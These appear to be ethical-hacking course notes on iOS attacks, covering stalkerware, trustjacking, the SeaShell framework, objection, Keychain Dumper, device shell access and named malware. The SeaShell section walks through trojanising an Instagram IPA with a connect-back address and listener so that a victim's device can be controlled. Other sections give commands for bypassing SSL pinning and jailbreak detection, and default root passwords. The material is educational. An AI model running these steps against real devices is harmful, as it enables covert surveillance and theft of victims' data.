# 07 — Hacking iOS Devices (Tools, Techniques & Commands)

> **Objective 3 (EC‑Council):** Explain Various iOS Threats and Attacks — Part B (Exploitation)

## Table of Contents
- [7.1 Commercial Spyware — Spyzie](#71-commercial-spyware--spyzie)
- [7.2 iOS Trustjacking](#72-ios-trustjacking)
- [7.3 Post‑Exploitation with the SeaShell Framework](#73-post-exploitation-with-the-seashell-framework)
- [7.4 Analyzing & Manipulating iOS Apps (Cycript, Method Swizzling)](#74-analyzing--manipulating-ios-apps-cycript-method-swizzling)
- [7.5 Extracting Secrets with Keychain Dumper](#75-extracting-secrets-with-keychain-dumper)
- [7.6 Runtime Analysis with objection](#76-runtime-analysis-with-objection)
- [7.7 Analyzing a Connected iOS Device](#77-analyzing-a-connected-ios-device)
- [7.8 iOS Malware](#78-ios-malware)
- [7.9 iOS Hacking / Forensic Tools](#79-ios-hacking--forensic-tools)

---

## 7.1 Commercial Spyware — Spyzie

*Source: spyzie.io*

A commercial "stalkerware" product marketed for monitoring, but functionally an attacker toolkit: hacks SMS, call logs, app chats, GPS location, browser history, photos, videos, social apps, calendars, and installed applications. Works across iPhone/iPad/iPod **without requiring a jailbreak** — it typically relies on the target's iCloud credentials plus iCloud backup/sync data rather than an on‑device implant, which is also why enabling **two‑factor authentication on the target's Apple ID** is one of the most effective real‑world defenses against this entire category of tool.

## 7.2 iOS Trustjacking

*Source: broadcom.com*

Exploits the **"iTunes Wi‑Fi Sync"** feature and the ordinary "**Trust This Computer?**" dialog every iOS user has seen.

1. Victim connects their iPhone via USB to a computer that is *already compromised/controlled by the attacker* (could be a friend's laptop, a public charging kiosk, a "juice‑jacking" station, etc.).
2. iOS shows: *"Trust This Computer? Your settings and data will be accessible from this computer when connected."* — options **Trust** / **Don't Trust**.
3. If the victim taps **Trust**, and iTunes Wi‑Fi Sync gets enabled on that computer, the trust relationship **persists even after the USB cable is unplugged** — the attacker's computer can keep talking to the phone over Wi‑Fi indefinitely, until the victim manually resets their device's trusted‑computer list (`Settings → General → Transfer or Reset → Reset Location & Privacy`).
4. From that point the attacker can monitor the device's screen/data remotely, read SMS history and even **deleted photos** via backup/restore, and replace legitimate apps with malicious ones sourced from the previously‑trusted PC.

## 7.3 Post‑Exploitation with the SeaShell Framework

*Source: github.com (EntySec)*

SeaShell is an iOS post‑exploitation framework built around exploiting the **CoreTrust vulnerability**, which lets it bypass code‑signing checks for unauthorized software execution (via **TrollStore**‑style sideloading) and drop a **Pwny** payload with dynamic extensions and TLS‑encrypted C2.

```text
--=[ SeaShell Framework 1.0.0
    Developed by EntySec (https://entysec.com)

# 1. Launch the framework
seashell

# 2. Patch a legitimate-looking IPA with your callback address
(seashell)> ipa patch Instagram.ipa
[>] Host to connect back: 192.168.2.116
[>] Port to connect back: 8888
[+] IPA at Instagram.ipa patched!

# (alternative) build a fresh IPA from scratch instead of patching one
(seashell)> ipa build
[>] Application name: Mussel
[>] Bundle ID (com.entysec.mussel): 
[?] Add application icon [y/N]: n
[>] Host to connect back: 192.168.2.116
[>] Port to connect back: 8888
[>] Path to save the IPA: Mussel.ipa
[+] IPA saved to Mussel.ipa!

# 3. Start a listener that matches the host/port baked into the IPA
(seashell)> listener on 192.168.2.116 8888

# 4. Get the victim to install & open the patched/built IPA, then interact:
(seashell)> devices -i <id>
(seashell)> help                 # list all available post-exploitation commands

# 5. Example post-exploitation module: dump Safari browsing history
(seashell)> safari_history
# Parses the on-device database at /var/mobile/Library/Safari/
```

> Delivering a sideloaded IPA to a victim requires either a compromised/free developer‑signing workflow (TrollStore/CoreTrust abuse, as above) or physical/social access — Apple's App Store review process is the reason this can't simply be uploaded and organically installed.

## 7.4 Analyzing & Manipulating iOS Apps (Cycript, Method Swizzling)

### Cycript
*Source: cycript.org*

A **JavaScript interpreter that also understands Objective‑C / Objective‑C++**, with an interactive console (syntax highlighting, tab‑completion). After decompiling and analyzing an app's source, attackers use Cycript to manipulate its live runtime behavior — method swizzling, authentication bypass, jailbreak‑detection bypass.

```text
cy# a
cy# [a objectAtIndex:0]
cy# [a setObject:@"value" atIndex:0]
cy# o.field
cy# [o setObject:a forKey:@"field"]
```

### iOS Method Swizzling ("Monkey Patching")
The Objective‑C runtime allows **swapping which implementation backs a given method selector** at runtime — this is a supported runtime feature, not a bug, and it's exactly what attackers (and legitimate AOP/analytics SDKs) both rely on.

**Steps to swap a method's functionality:**
1. Identify the existing method selector to be replaced.
2. Write a new method with the desired (customized) behavior.
3. Run the target app on the device.
4. Swap the functionality by handing the new method's reference to the Objective‑C runtime in place of the old one.

Common malicious/offensive uses: silent logging, injecting JavaScript into WebViews, bypassing jailbreak‑detection routines, and bypassing authentication checks.

## 7.5 Extracting Secrets with Keychain Dumper

*Source: github.com*

iOS's **Keychain** is an encrypted store for passwords, certificates, and encryption keys. **Keychain Dumper** ships as a binary with a **self‑signed certificate carrying a wildcard entitlement** so it can read *any* app's keychain items. Because wildcard entitlements are blocked on recent iOS releases, a device‑specific **explicit entitlement** typically has to be added before all keychain items become readable again.

## 7.6 Runtime Analysis with objection

*Source: github.com (sensepost/objection)* — built on top of **Frida**, so it works without needing a jailbreak in many cases (it can patch/repackage an IPA to embed the Frida gadget instead).

**Method hooking:**
```bash
# Attach to a running/gadget-embedded app
objection --gadget <AppName> explore

# Watch every call made to a class
ios hooking watch class <Class_Name>

# Watch (hook) one specific method
ios hooking watch method "-[ClassName Method_Name]"

# Force a Boolean-returning method's hooked return value
ios hooking set return value "-[ClassName Function_Name:]" true
```

**Bypassing SSL Pinning:**
```bash
ios sslpinning disable
```

**Bypassing Jailbreak Detection:**
```bash
ios jailbreak disable
```

> objection also supports iOS **keychain dumping** and **pasteboard monitoring** out of the box — see its own `--help` for the full command tree.

## 7.7 Analyzing a Connected iOS Device

*Source: mas.owasp.org*

### Accessing the Device Shell (over Wi‑Fi, jailbroken device)
1. Install **OpenSSH** on the iOS device; put the device and attack host on the same Wi‑Fi network.
2. Connect:
```bash
ssh root@<device_ip_address>
# default users: "root" and "mobile" — default password for BOTH: "alpine"
exit   # or Ctrl+D to quit
```

### Accessing the Device Shell (over USB, via usbmuxd)
```bash
# 1. Bridge the SSH-over-USB port using iproxy (from libimobiledevice)
iproxy 2222 22

# 2. In a new terminal, connect through the forwarded port
ssh -p 2222 root@localhost
root@localhost's password:      # default: alpine
iPhone:~ root#
```
> Note: you cannot maintain a data connection for more than ~1 hour with the screen locked, due to Apple's **USB Restricted Mode**.

### Listing Installed Apps
```bash
frida-ps -Uai
# note the bundle identifier + PID for later use
```

### Network Sniffing (via a virtual remote interface)
```bash
# 1. Connect the target iOS device to a macOS host via USB, then:
rvictl -s <UDID_of_the_iOS_device>

# 2. Open Wireshark, select interface "rvi0"

# 3. Capture filter example — all HTTP traffic to/from a specific host:
ip.addr == 192.168.2.4 && http
```

### Obtaining Open Connections
```bash
lsof -i                     # all open network ports, all active processes
lsof -i -a -p <pid>         # open network ports for one specific process
```

### Process Exploration with r2frida
```bash
# Requires the target app (e.g. iGoat-Swift) running on the iOS device, connected via USB
r2 frida://usb//iGoat-Swift

:dm            # retrieve the app's memory maps
:il            # list loaded binaries/libraries
\e~search      # in-memory search: print only results, hide search progress
```

## 7.8 iOS Malware

*Sources: malwarebytes.com, group-ib.com*

### GoldPickaxe.iOS
A face‑scanning/identity‑theft Trojan delivered via smishing/phishing pretending to be from a government agency:

1. Victim is convinced to install a fake "service" application via **TestFlight** (Apple's own beta‑distribution channel — abused here to sidestep full App Store review) or a fraudulent website.
2. The app asks the victim to install a **masked Mobile Device Management (MDM) profile**.
3. Once the MDM profile is accepted, the attacker can remotely push profiles/commands — leveraging MDM's own legitimate remote‑wipe, tracking, and app‑management features for malicious ends (see file 09 for what MDM profiles can legitimately do, and why that power is dangerous in the wrong hands).
4. The victim is asked to scan their face and photograph an official ID, plus provide their phone number — enabling deep identity fraud and bank‑account compromise.

### Other Named iOS Malware/Spyware (cited, brief)
| Name | Category |
|---|---|
| SpectralBlur | Backdoor malware (linked to DPRK-attributed activity in public reporting) |
| Mercenary Spyware | Category label for commercial nation‑state‑grade spyware sold to governments |
| LightSpy | Modular iOS surveillance implant |
| KingsPawn | Spyware component associated with commercial surveillance vendors |
| Pegasus | NSO Group's zero‑click surveillance spyware, the best‑known example in this category |

## 7.9 iOS Hacking / Forensic Tools

### Elcomsoft Phone Breaker
*Source: elcomsoft.com*

A forensic/password‑recovery suite that performs **logical and over‑the‑air acquisition** of iOS devices, breaks into encrypted local backups (GPU‑accelerated password/brute‑force recovery), and downloads/decrypts synced data from **Apple iCloud** — including the iCloud **Keychain** and iMessage history with attached media/documents.

### Other Cited iOS Hacking Tools
| Tool | URL | Purpose |
|---|---|---|
| Enzyme | github.com | — |
| Network Analyzer: net tools | apps.apple.com | On‑device network diagnostics/scanning |
| iOS Binary Security Analyzer | github.com | Binary hardening/entitlement analysis |
| iWepPRO | apps.apple.com | Wi‑Fi security auditing |
| Frida | frida.re | Cross‑platform dynamic instrumentation (see also files 03 and §7.6 above) |

---
**Previous:** [`06-ios-architecture-and-jailbreaking.md`](06-ios-architecture-and-jailbreaking.md) | **Next:** [`08-securing-ios-devices.md`](08-securing-ios-devices.md)
